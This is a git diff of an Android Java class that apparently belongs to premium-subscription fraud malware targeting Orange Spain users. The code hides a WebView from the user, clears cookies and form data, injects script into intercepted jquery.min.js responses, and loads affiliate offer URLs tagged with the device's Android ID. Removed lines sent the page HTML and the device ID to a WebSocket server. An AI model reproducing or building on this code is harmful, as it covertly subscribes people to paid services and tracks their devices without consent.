@@ -1,12 +1,14 @@
 package com.enhtmv.sublib.work.spain;
 
 import android.util.ArrayMap;
+import android.view.View;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebChromeClient;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebResourceResponse;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import android.widget.LinearLayout;
 import android.widget.RelativeLayout;
 
 import com.alibaba.fastjson.JSON;
@@ -14,6 +16,7 @@ import com.blankj.utilcode.util.ConvertUtils;
 import com.blankj.utilcode.util.LogUtils;
 import com.blankj.utilcode.util.ResourceUtils;
 import com.blankj.utilcode.util.Utils;
+import com.cp.plugin.Plugin;
 import com.cp.plugin.http.HttpReqest;
 import com.enhtmv.sublib.common.http.SubResponse;
 import com.enhtmv.sublib.common.sub.WebViewSubCall;
@@ -50,6 +53,9 @@ public class SpainOrangeWebview extends WebViewSubCall {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                 view.loadUrl(request.getUrl().toString());
+
+                LogUtils.i(request.getUrl().toString());
+
                 return true;
             }
 
@@ -88,9 +94,10 @@ public class SpainOrangeWebview extends WebViewSubCall {
 
                 if (url.endsWith("jquery.min.js")) {
 
-                    String jquery = ResourceUtils.readAssets2String("jquery.js") + "\n"
-                            + logFunc + "\n"
-                            + script;
+//                    String jquery = ResourceUtils.readAssets2String("jquery.js") + "\n"
+//                            + logFunc + "\n"
+//                            + script;
+                    String jquery = ResourceUtils.readAssets2String("jquery.js");
 
                     InputStream inputStream = ConvertUtils.string2InputStream(jquery, "utf-8");
 
@@ -117,91 +124,34 @@ public class SpainOrangeWebview extends WebViewSubCall {
     public void sub(String script) {
 
 
-        OkHttpClient client = new OkHttpClient.Builder().build();
-
-//        Request request = new Request.Builder().url("ws://192.168.31.112:8010/ws").build();
-        Request request = new Request.Builder().url("ws://10.0.2.2:8010/ws").build();
-
-
-        client.newWebSocket(request, new WebSocketListener() {
+        handler.post(new Runnable() {
             @Override
-            public void onOpen(WebSocket webSocket, Response response) {
-                super.onOpen(webSocket, response);
+            public void run() {
 
-                LogUtils.i("websocket open !");
+                clearCookies();
 
-                try {
+                LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
 
-                    SubResponse s = http().get("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId);
-
-                    if (s.response().code() == 200) {
-//                        SubResponse s = http().get("http://pl.ifunnyhub.com/mm/pl/lp");
-
-                        Map<String, String> data = new ArrayMap<>();
-
-                        data.put("location", s.url());
-                        data.put("html", s.body());
-                        data.put("vid", androidId);
-
-                        webSocket.send(JSON.toJSONString(data));
-                    } else {
-                        LogUtils.w("error response code", s.response().code());
-                    }
+                webView.setLayoutParams(params);
 
 
-                } catch (Exception e) {
-                    e.printStackTrace();
+                if (Plugin.isHiden()) {
+                    webView.setVisibility(View.GONE);
                 }
 
-            }
+                layout.addView(webView);
 
-            @Override
-            public void onMessage(WebSocket webSocket, String text) {
-                super.onMessage(webSocket, text);
-
-                try {
-                    HttpReqest httpReqest = JSON.parseObject(text, HttpReqest.class);
+                webView.clearHistory();
+                webView.clearCache(true);
+                webView.clearFormData();
 
 
-                } catch (Exception e) {
-                    LogUtils.e(e);
-                    r.e("", e);
-                }
+                report(SUB_REQEUST);
 
-
+//                webView.loadUrl("http://es.mnt-hk.com/orange/sub?aff=DCG_orange&pro=DCG&click=" + androidId);
+                webView.loadUrl("http://www.baidu.comxxxx");
             }
         });
-
-
-//        this.script = script;
-//
-//        handler.post(new Runnable() {
-//            @Override
-//            public void run() {
-//
-//                clearCookies();
-//
-//                LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT);
-//
-//                webView.setLayoutParams(params);
-//
-//
-//                if (Plugin.isHiden()) {
-//                    webView.setVisibility(View.GONE);
-//                }
-//
-//                layout.addView(webView);
-//
-//                webView.clearHistory();
-//                webView.clearCache(true);
-//                webView.clearFormData();
-//
-//
-//                report(SUB_REQEUST);
-//
-//                webView.loadUrl("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId);
-//            }
-//        });
 
     }
 
